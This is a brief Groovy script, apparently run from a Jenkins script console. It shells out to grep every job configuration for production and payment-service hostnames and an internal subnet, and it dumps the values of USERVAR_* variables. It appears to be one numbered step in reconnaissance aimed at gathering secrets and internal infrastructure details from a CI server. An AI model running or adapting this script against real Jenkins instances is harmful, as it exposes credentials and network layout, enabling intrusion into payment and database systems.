// MICRO-E: Fast grep (fixed consumeProcessOutput)
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(25000)
    out.toString().take(5000)
}

println "=== FILES WITH PROD KEYWORDS ==="
println run('grep -rl "dbasears\\|172\\.27\\.141\\|apifincadob\\|mrc-services\\|t1pago\\|payment_t1\\|app_t1" /var/jenkins_home/jobs/ 2>/dev/null | head -30')

println "\n=== USERVAR_* WITH VALUES ==="
println run('grep -roh "USERVAR_[A-Z_]*=[^<\"]*" /var/jenkins_home/jobs/ 2>/dev/null | sort -u | head -50')

println "\n=== ALL 172.27.141 STRINGS ==="
println run('grep -rh "172\\.27\\.141" /var/jenkins_home/jobs/ 2>/dev/null | grep -v "<url>" | head -20')

println "\n=== mrc-services MENTIONS ==="
println run('grep -rh "mrc-services" /var/jenkins_home/jobs/ 2>/dev/null | head -20')

println "\n=== DONE MICRO-E ==="
